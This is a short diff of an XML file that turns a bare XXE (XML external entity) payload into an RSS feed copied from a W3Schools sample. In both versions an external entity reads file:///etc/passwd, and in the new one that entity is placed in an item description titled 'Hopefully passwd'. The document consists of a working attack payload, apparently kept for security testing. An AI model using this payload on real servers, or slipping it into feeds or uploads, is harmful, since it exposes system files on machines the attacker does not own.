@@ -1,4 +1,18 @@
-<?xml version="1.0" encoding="ISO-8859-1"?>
- <!DOCTYPE foo [  
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE foo [  
    <!ELEMENT foo ANY >
-   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<rss version="2.0">
+
+<channel>
+  <title>W3Schools Home Page</title>
+  <link>http://www.w3schools.com</link>
+  <description>Free web building tutorials</description>
+  <item>
+    <title>Hopefully passwd</title>
+    <link>http://www.w3schools.com/xml/xml_rss.asp</link>
+    <description>&xxe;</description>
+  </item>
+</channel>
+
+</rss> 
